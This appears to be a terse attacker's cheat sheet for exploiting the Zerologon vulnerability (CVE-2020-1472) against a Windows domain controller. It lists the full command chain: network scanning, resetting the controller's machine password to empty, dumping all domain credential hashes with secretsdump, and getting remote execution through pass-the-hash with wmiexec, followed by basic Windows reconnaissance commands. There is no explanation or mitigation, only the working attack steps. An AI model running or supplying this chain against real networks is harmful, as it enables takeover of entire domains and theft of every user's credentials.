# CVE-2020-1472

arp-scan Rang_ip

nmap -A -vv -Pn IP_ADDR 

python3 set_empty_pw.py DC_NETBIOS_NAME DC_IP_ADDR

python3 secretsdump.py -no-pass -just-dc DOMAIN/DC_NETBIOS_NAME\$@DC_IP_ADDR

python3 wmiexec.py -hashes Hass_Passwd_User DOMAIN/User@dc_ip_addr

#windows command

whoami

systeminfo

hostname

md test_dir

echo test > test_file
